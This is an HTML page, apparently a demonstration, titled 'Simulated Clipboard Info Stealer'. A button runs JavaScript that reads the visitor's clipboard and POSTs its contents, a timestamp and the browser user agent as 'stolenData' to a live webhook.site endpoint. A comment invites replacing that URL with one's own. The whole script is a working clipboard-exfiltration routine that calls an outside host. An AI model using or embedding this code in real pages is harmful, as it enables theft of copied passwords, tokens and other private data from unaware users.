<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clipboard Info Stealer (Simulated)</title>
  <style>
    body {
      background-color: #1e1e2f;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
    }

    h1 {
      color: #FF4444;
    }

    button {
      background-color: #cc0000;
      border: none;
      border-radius: 8px;
      color: white;
      font-size: 16px;
      padding: 12px 24px;
      cursor: pointer;
      margin-top: 20px;
    }

    button:hover {
      background-color: #ff3333;
    }

    #output {
      margin-top: 30px;
      font-size: 18px;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>üö® Simulated Clipboard Info Stealer</h1>
  <button onclick="stealClipboard()">Steal Clipboard</button>
  <div id="output">Click the button to fetch your clipboard and send it to webhook.site</div>

  <script>
    async function stealClipboard() {
      const output = document.getElementById("output");

      if (!navigator.clipboard) {
        output.innerText = "‚ùå Clipboard API not supported in this browser.";
        return;
      }

      try {
        const data = await navigator.clipboard.readText();
        output.innerText = "üìã Clipboard contents:\n" + data;

        const webhookURL = "https://webhook.site/ed442c85-933a-4da3-987c-14d277c4d8e1"; // Replace with your actual webhook URL

        const payload = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          stolenData: data
        };

        const response = await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });

        const result = await response.text();

        console.log("‚úÖ Webhook POST Status:", response.status);
        console.log("üì¶ Payload sent:", payload);
        console.log("üì• Webhook response:", result);

        output.innerText += `\n\n‚úÖ Sent to webhook\nStatus: ${response.status}\nPayload:\n${JSON.stringify(payload, null, 2)}`;

      } catch (err) {
        output.innerText = "‚ùå Failed to read or send clipboard data:\n" + err;
        console.error("Error:", err);
      }
    }
  </script>
</body>
</html>
